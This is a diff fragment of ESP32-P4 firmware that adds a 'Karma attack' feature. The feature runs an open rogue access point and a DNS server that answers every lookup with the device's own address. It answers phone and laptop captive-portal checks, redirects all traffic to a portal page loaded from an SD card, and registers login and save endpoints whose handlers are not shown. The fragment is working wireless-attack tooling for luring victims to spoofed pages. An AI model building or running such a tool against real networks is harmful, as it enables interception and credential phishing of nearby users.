+    httpd_resp_send(req, html, HTTPD_RESP_USE_STRLEN);
+    return ESP_OK;
+}
+
+// iOS captive portal detection
+static esp_err_t ios_captive_handler(httpd_req_t *req)
+{
+    httpd_resp_set_status(req, "200 OK");
+    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
+    httpd_resp_set_hdr(req, "Content-Type", "text/html");
+    
+    const char *html = custom_portal_html ? custom_portal_html : default_portal_html;
+    httpd_resp_send(req, html, HTTPD_RESP_USE_STRLEN);
+    return ESP_OK;
+}
+
+// Generic captive detection handler
+static esp_err_t captive_detection_handler(httpd_req_t *req)
+{
+    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
+    httpd_resp_set_type(req, "text/html");
+    
+    const char *html = custom_portal_html ? custom_portal_html : default_portal_html;
+    httpd_resp_send(req, html, HTTPD_RESP_USE_STRLEN);
+    return ESP_OK;
+}
+
+// Catch-all redirect handler
+static esp_err_t captive_portal_redirect_handler(httpd_req_t *req)
+{
+    httpd_resp_set_status(req, "302 Found");
+    httpd_resp_set_hdr(req, "Location", "/portal");
+    httpd_resp_send(req, NULL, 0);
+    return ESP_OK;
+}
+
+// ============================================================================
+// DNS Server for Captive Portal
+// ============================================================================
+
+static void dns_server_task(void *pvParameters)
+{
+    (void)pvParameters;
+    
+    struct sockaddr_in server_addr;
+    struct sockaddr_in client_addr;
+    socklen_t client_addr_len = sizeof(client_addr);
+    
+    // Allocate buffers from PSRAM - keep them for task lifetime (never freed)
+    static char *rx_buffer = NULL;
+    static char *tx_buffer = NULL;
+    
+    if (!rx_buffer) {
+        rx_buffer = heap_caps_malloc(DNS_MAX_PACKET_SIZE, MALLOC_CAP_SPIRAM);
+    }
+    if (!tx_buffer) {
+        tx_buffer = heap_caps_malloc(DNS_MAX_PACKET_SIZE, MALLOC_CAP_SPIRAM);
+    }
+    if (!rx_buffer || !tx_buffer) {
+        ESP_LOGE(TAG, "DNS: Failed to allocate buffers from PSRAM");
+        dns_server_task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+    
+    // Outer loop - task never exits, just waits for portal_active
+    while (1) {
+        // Wait until portal becomes active
+        while (!portal_active) {
+            vTaskDelay(pdMS_TO_TICKS(100));
+        }
+        
+        // Create UDP socket
+        dns_server_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+        if (dns_server_socket < 0) {
+            ESP_LOGE(TAG, "DNS: Failed to create socket");
+            vTaskDelay(pdMS_TO_TICKS(1000));
+            continue;
+        }
+        
+        // Bind to port 53
+        memset(&server_addr, 0, sizeof(server_addr));
+        server_addr.sin_family = AF_INET;
+        server_addr.sin_port = htons(53);
+        server_addr.sin_addr.s_addr = INADDR_ANY;
+        
+        if (bind(dns_server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
+            ESP_LOGE(TAG, "DNS: Failed to bind socket");
+            close(dns_server_socket);
+            dns_server_socket = -1;
+            vTaskDelay(pdMS_TO_TICKS(1000));
+            continue;
+        }
+        
+        ESP_LOGI(TAG, "DNS server started on port 53");
+        
+        // Set socket timeout
+        struct timeval timeout;
+        timeout.tv_sec = 1;
+        timeout.tv_usec = 0;
+        setsockopt(dns_server_socket, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
+        
+        // Inner loop - handle DNS requests while portal is active
+        while (portal_active && dns_server_socket >= 0) {
+            int len = recvfrom(dns_server_socket, rx_buffer, DNS_MAX_PACKET_SIZE, 0,
+                              (struct sockaddr *)&client_addr, &client_addr_len);
+            
+            if (len < 0) {
+                // Check if it's just a timeout (EAGAIN/EWOULDBLOCK) - ignore and continue
+                if (errno == EAGAIN || errno == EWOULDBLOCK) {
+                    continue;
+                }
+                break;  // Real socket error
+            }
+            if (!portal_active || dns_server_socket < 0) break;  // Portal stopped
+            if (len < 12) continue;  // Invalid DNS packet
+            
+            // Build DNS response - redirect all queries to 172.0.0.1
+            memcpy(tx_buffer, rx_buffer, len);
+            
+            // Set response flags
+            tx_buffer[2] = 0x81;  // QR=1 (response), Opcode=0, AA=1
+            tx_buffer[3] = 0x80;  // RA=1
+            
+            // Set answer count = 1
+            tx_buffer[6] = 0x00;
+            tx_buffer[7] = 0x01;
+            
+            // Find end of question section
+            int question_end = 12;
+            while (question_end < len && rx_buffer[question_end] != 0) {
+                question_end += rx_buffer[question_end] + 1;
+            }
+            question_end += 5;  // Skip null byte + QTYPE (2) + QCLASS (2)
+            
+            // Build answer section
+            int answer_offset = question_end;
+            
+            // Name pointer to question
+            tx_buffer[answer_offset++] = 0xC0;
+            tx_buffer[answer_offset++] = 0x0C;
+            
+            // Type A
+            tx_buffer[answer_offset++] = 0x00;
+            tx_buffer[answer_offset++] = 0x01;
+            
+            // Class IN
+            tx_buffer[answer_offset++] = 0x00;
+            tx_buffer[answer_offset++] = 0x01;
+            
+            // TTL (60 seconds)
+            tx_buffer[answer_offset++] = 0x00;
+            tx_buffer[answer_offset++] = 0x00;
+            tx_buffer[answer_offset++] = 0x00;
+            tx_buffer[answer_offset++] = 0x3C;
+            
+            // Data length (4 bytes for IPv4)
+            tx_buffer[answer_offset++] = 0x00;
+            tx_buffer[answer_offset++] = 0x04;
+            
+            // IP address: 172.0.0.1
+            tx_buffer[answer_offset++] = 172;
+            tx_buffer[answer_offset++] = 0;
+            tx_buffer[answer_offset++] = 0;
+            tx_buffer[answer_offset++] = 1;
+            
+            sendto(dns_server_socket, tx_buffer, answer_offset, 0,
+                   (struct sockaddr *)&client_addr, client_addr_len);
+        }
+        
+        // Close socket when portal stops
+        if (dns_server_socket >= 0) {
+            close(dns_server_socket);
+            dns_server_socket = -1;
+        }
+        
+        ESP_LOGI(TAG, "DNS server stopped");
+        
+        // Don't exit - go back to waiting for portal_active
+        // This avoids pthread TLS cleanup issues with vTaskDelete
+    }
+}
+
+// ============================================================================
+// Start/Stop Captive Portal
+// ============================================================================
+
+static esp_err_t start_captive_portal(const char *ssid)
+{
+    if (portal_active) {
+        ESP_LOGW(TAG, "Portal already active");
+        return ESP_ERR_INVALID_STATE;
+    }
+    
+    ESP_LOGI(TAG, "Starting captive portal with SSID: %s", ssid);
+    
+    // Ensure WiFi is initialized via ESP-Hosted
+    if (!esp_modem_wifi_initialized) {
+        ESP_LOGI(TAG, "Initializing WiFi via ESP-Hosted...");
+        esp_err_t wifi_ret = esp_modem_wifi_init();
+        if (wifi_ret != ESP_OK) {
+            ESP_LOGE(TAG, "Failed to initialize WiFi: %s", esp_err_to_name(wifi_ret));
+            return wifi_ret;
+        }
+    }
+    
+    // Store SSID
+    if (portal_ssid) free(portal_ssid);
+    portal_ssid = strdup(ssid);
+    
+    // Get existing AP netif or create new one (ESP-Hosted compatible)
+    if (!ap_netif) {
+        // First try to get existing AP netif
+        ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
+        if (!ap_netif) {
+            ESP_LOGI(TAG, "Creating new AP netif...");
+            // Create AP netif manually without ESP_ERROR_CHECK
+            esp_netif_inherent_config_t base_cfg = ESP_NETIF_INHERENT_DEFAULT_WIFI_AP();
+            esp_netif_config_t cfg = {
+                .base = &base_cfg,
+                .driver = NULL,
+                .stack = ESP_NETIF_NETSTACK_DEFAULT_WIFI_AP,
+            };
+            ap_netif = esp_netif_new(&cfg);
+            if (!ap_netif) {
+                ESP_LOGE(TAG, "Failed to create AP netif");
+                return ESP_ERR_NO_MEM;
+            }
+            // Attach WiFi driver to netif
+            esp_err_t attach_ret = esp_netif_attach_wifi_ap(ap_netif);
+            if (attach_ret != ESP_OK) {
+                ESP_LOGW(TAG, "Failed to attach WiFi AP driver: %s (may already be attached)", esp_err_to_name(attach_ret));
+            }
+            esp_wifi_set_default_wifi_ap_handlers();
+        } else {
+            ESP_LOGI(TAG, "Using existing AP netif");
+        }
+    }
+    
+    // Set WiFi mode to AP+STA (or just AP if no STA needed)
+    esp_err_t ret = esp_wifi_set_mode(WIFI_MODE_APSTA);
+    if (ret != ESP_OK) {
+        ESP_LOGE(TAG, "Failed to set APSTA mode: %s", esp_err_to_name(ret));
+        return ret;
+    }
+    
+    // Stop DHCP server to configure (ignore error if not running)
+    esp_netif_dhcps_stop(ap_netif);
+    
+    // Set static IP 172.0.0.1
+    esp_netif_ip_info_t ip_info;
+    ip_info.ip.addr = esp_ip4addr_aton("172.0.0.1");
+    ip_info.gw.addr = esp_ip4addr_aton("172.0.0.1");
+    ip_info.netmask.addr = esp_ip4addr_aton("255.255.255.0");
+    
+    ret = esp_netif_set_ip_info(ap_netif, &ip_info);
+    if (ret != ESP_OK) {
+        ESP_LOGE(TAG, "Failed to set IP info: %s", esp_err_to_name(ret));
+        return ret;
+    }
+    
+    ESP_LOGI(TAG, "AP IP set to 172.0.0.1");
+    
+    // Configure AP
+    wifi_config_t ap_config = {0};
+    size_t ssid_len = strlen(ssid);
+    if (ssid_len > 32) ssid_len = 32;
+    memcpy(ap_config.ap.ssid, ssid, ssid_len);
+    ap_config.ap.ssid_len = ssid_len;
+    ap_config.ap.channel = 1;
+    ap_config.ap.password[0] = '\0';
+    ap_config.ap.max_connection = 4;
+    ap_config.ap.authmode = WIFI_AUTH_OPEN;
+    
+    ret = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+    if (ret != ESP_OK) {
+        ESP_LOGE(TAG, "Failed to set AP config: %s", esp_err_to_name(ret));
+        return ret;
+    }
+    
+    // Start DHCP server
+    ret = esp_netif_dhcps_start(ap_netif);
+    if (ret != ESP_OK) {
+        ESP_LOGE(TAG, "Failed to start DHCP server: %s", esp_err_to_name(ret));
+        return ret;
+    }
+    
+    vTaskDelay(pdMS_TO_TICKS(500));
+    
+    // Start HTTP server only if not already running (we never stop it to avoid TLS crash)
+    if (portal_server == NULL) {
+        httpd_config_t config = HTTPD_DEFAULT_CONFIG();
+        config.server_port = 80;
+        config.max_open_sockets = 7;
+        config.max_uri_handlers = 12;  // We have 10 handlers, default is 8
+        config.uri_match_fn = httpd_uri_match_wildcard;
+        config.stack_size = 8192;      // Increase stack for larger requests
+        config.recv_wait_timeout = 10; // Increase timeout for slow clients
+        
+        ret = httpd_start(&portal_server, &config);
+        if (ret != ESP_OK) {
+            ESP_LOGE(TAG, "Failed to start HTTP server: %s", esp_err_to_name(ret));
+            return ret;
+        }
+        
+        ESP_LOGI(TAG, "HTTP server started on port 80");
+        
+        // Register URI handlers (only once, handlers stay registered)
+        httpd_uri_t root_uri = { .uri = "/", .method = HTTP_GET, .handler = portal_root_handler };
+        httpd_register_uri_handler(portal_server, &root_uri);
+        
+        httpd_uri_t root_post_uri = { .uri = "/", .method = HTTP_POST, .handler = portal_root_handler };
+        httpd_register_uri_handler(portal_server, &root_post_uri);
+        
+        httpd_uri_t portal_uri = { .uri = "/portal", .method = HTTP_GET, .handler = portal_page_handler };
+        httpd_register_uri_handler(portal_server, &portal_uri);
+        
+        httpd_uri_t login_uri = { .uri = "/login", .method = HTTP_POST, .handler = portal_login_handler };
+        httpd_register_uri_handler(portal_server, &login_uri);
+        
+        httpd_uri_t get_uri = { .uri = "/get", .method = HTTP_GET, .handler = portal_get_handler };
+        httpd_register_uri_handler(portal_server, &get_uri);
+        
+        httpd_uri_t save_uri = { .uri = "/save", .method = HTTP_POST, .handler = portal_save_handler };
+        httpd_register_uri_handler(portal_server, &save_uri);
+        
+        httpd_uri_t android_uri = { .uri = "/generate_204", .method = HTTP_GET, .handler = android_captive_handler };
+        httpd_register_uri_handler(portal_server, &android_uri);
+        
+        httpd_uri_t ios_uri = { .uri = "/hotspot-detect.html", .method = HTTP_GET, .handler = ios_captive_handler };
+        httpd_register_uri_handler(portal_server, &ios_uri);
+        
+        httpd_uri_t ncsi_uri = { .uri = "/ncsi.txt", .method = HTTP_GET, .handler = captive_detection_handler };
+        httpd_register_uri_handler(portal_server, &ncsi_uri);
+        
+        httpd_uri_t wildcard_uri = { .uri = "/*", .method = HTTP_GET, .handler = captive_portal_redirect_handler };
+        httpd_register_uri_handler(portal_server, &wildcard_uri);
+    } else {
+        ESP_LOGI(TAG, "HTTP server already running, reusing");
+    }
+    
+    // Mark portal as active
+    portal_active = true;
+    
+    // Start DNS server - reuse existing task if available (task never exits)
+    if (dns_server_task_handle == NULL) {
+        xTaskCreate(dns_server_task, "dns_server", 8192, NULL, 5, &dns_server_task_handle);
+    }
+    // If task already exists, it will detect portal_active and start serving
+    
+    ESP_LOGI(TAG, "Captive portal started successfully!");
+    ESP_LOGI(TAG, "Connect to '%s' WiFi to access the portal", ssid);
+    
+    return ESP_OK;
+}
+
+static void stop_captive_portal(void)
+{
+    ESP_LOGI(TAG, "Stopping captive portal...");
+    
+    // Signal task to stop
+    portal_active = false;
+    
+    // Don't delete DNS server task - it has an outer loop and will wait for portal_active
+    // Deleting tasks that use sockets causes pthread TLS cleanup issues on ESP32
+    // Just close socket to unblock it - the task will stop and wait
+    if (dns_server_socket >= 0) {
+        int sock = dns_server_socket;
+        dns_server_socket = -1;
+        close(sock);
+    }
+    
+    // Wait briefly for task to notice and stop
+    vTaskDelay(pdMS_TO_TICKS(100));
+    
+    // DON'T stop HTTP server - httpd_stop() deletes worker tasks which causes
+    // pthread TLS cleanup crash on ESP32-P4 RISC-V. Just leave it running.
+    // The handlers check portal_active and will return errors when portal is stopped.
+    // Server will be reused when portal starts again.
+    
+    // Free portal SSID
+    if (portal_ssid) {
+        free(portal_ssid);
+        portal_ssid = NULL;
+    }
+    
+    // Free custom HTML
+    if (custom_portal_html) {
+        free(custom_portal_html);
+        custom_portal_html = NULL;
+    }
+    
+    // Switch back to STA mode
+    esp_wifi_set_mode(WIFI_MODE_STA);
+    
+    ESP_LOGI(TAG, "Captive portal stopped");
+}
+
+// ============================================================================
+// Karma Attack Popup
+// ============================================================================
+
+static void show_karma2_attack_popup(const char *ssid)
+{
+    lv_obj_t *scr = lv_scr_act();
+    
+    karma2_attack_popup_overlay = lv_obj_create(scr);
+    lv_obj_remove_style_all(karma2_attack_popup_overlay);
+    lv_obj_set_size(karma2_attack_popup_overlay, lv_pct(100), lv_pct(100));
+    lv_obj_set_style_bg_color(karma2_attack_popup_overlay, lv_color_hex(0x000000), 0);
+    lv_obj_set_style_bg_opa(karma2_attack_popup_overlay, LV_OPA_80, 0);
+    lv_obj_clear_flag(karma2_attack_popup_overlay, LV_OBJ_FLAG_SCROLLABLE);
+    
+    karma2_attack_popup_obj = lv_obj_create(karma2_attack_popup_overlay);
+    lv_obj_set_size(karma2_attack_popup_obj, 400, LV_SIZE_CONTENT);
+    lv_obj_center(karma2_attack_popup_obj);
+    lv_obj_set_style_bg_color(karma2_attack_popup_obj, lv_color_hex(0x1A1A1A), 0);
+    lv_obj_set_style_border_color(karma2_attack_popup_obj, COLOR_MATERIAL_ORANGE, 0);
+    lv_obj_set_style_border_width(karma2_attack_popup_obj, 2, 0);
+    lv_obj_set_style_radius(karma2_attack_popup_obj, 12, 0);
+    lv_obj_set_style_pad_all(karma2_attack_popup_obj, 25, 0);
+    lv_obj_set_flex_flow(karma2_attack_popup_obj, LV_FLEX_FLOW_COLUMN);
+    lv_obj_set_flex_align(karma2_attack_popup_obj, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
+    lv_obj_set_style_pad_row(karma2_attack_popup_obj, 15, 0);
+    lv_obj_clear_flag(karma2_attack_popup_obj, LV_OBJ_FLAG_SCROLLABLE);
+    
+    // Title
+    lv_obj_t *title = lv_label_create(karma2_attack_popup_obj);
+    lv_label_set_text(title, LV_SYMBOL_WIFI " Karma Attack Active");
+    lv_obj_set_style_text_font(title, &lv_font_montserrat_22, 0);
+    lv_obj_set_style_text_color(title, COLOR_MATERIAL_ORANGE, 0);
+    
+    // Status label
+    karma2_attack_status_label = lv_label_create(karma2_attack_popup_obj);
+    lv_label_set_text_fmt(karma2_attack_status_label, 
+        "Portal: %s\n\nWaiting for clients...\n\nConnect to the WiFi network above", ssid);
+    lv_obj_set_style_text_font(karma2_attack_status_label, &lv_font_montserrat_16, 0);
+    lv_obj_set_style_text_color(karma2_attack_status_label, lv_color_hex(0xCCCCCC), 0);
+    lv_obj_set_style_text_align(karma2_attack_status_label, LV_TEXT_ALIGN_CENTER, 0);
+    lv_obj_set_width(karma2_attack_status_label, lv_pct(100));
+    lv_label_set_long_mode(karma2_attack_status_label, LV_LABEL_LONG_WRAP);
+    
+    // Stop button
+    lv_obj_t *stop_btn = lv_btn_create(karma2_attack_popup_obj);
+    lv_obj_set_size(stop_btn, 150, 50);
+    lv_obj_set_style_bg_color(stop_btn, COLOR_MATERIAL_RED, 0);
+    lv_obj_set_style_radius(stop_btn, 8, 0);
+    lv_obj_add_event_cb(stop_btn, karma2_attack_stop_cb, LV_EVENT_CLICKED, NULL);
+    
+    lv_obj_t *stop_label = lv_label_create(stop_btn);
+    lv_label_set_text(stop_label, LV_SYMBOL_CLOSE " Stop Portal");
+    lv_obj_set_style_text_font(stop_label, &lv_font_montserrat_16, 0);
+    lv_obj_center(stop_label);
+}
+
+static void karma2_attack_stop_cb(lv_event_t *e)
+{
+    (void)e;
+    
+    ESP_LOGI(TAG, "Stopping Karma attack...");
+    
+    // Stop captive portal
+    stop_captive_portal();
+    
+    // Close popup
+    if (karma2_attack_popup_overlay) {
+        lv_obj_del(karma2_attack_popup_overlay);
+        karma2_attack_popup_overlay = NULL;
+        karma2_attack_popup_obj = NULL;
+        karma2_attack_status_label = NULL;
+    }
 }
 
 //==================================================================================
@@ -10506,6 +11707,15 @@ void app_main(void)
     
     // Initialize IO expander
     bsp_io_expander_pi4ioe_init(bsp_i2c_get_handle());
+    
+    // Initialize SD card
+    ESP_LOGI(TAG, "Initializing SD card...");
+    ret = bsp_sdcard_init(CONFIG_BSP_SD_MOUNT_POINT, 5);
+    if (ret != ESP_OK) {
+        ESP_LOGW(TAG, "SD card initialization failed: %s (captive portal HTML files won't be available)", esp_err_to_name(ret));
+    } else {
+        ESP_LOGI(TAG, "SD card mounted at %s", CONFIG_BSP_SD_MOUNT_POINT);
+    }
     
     // Enable battery charging
     ESP_LOGI(TAG, "Enabling battery charging...");
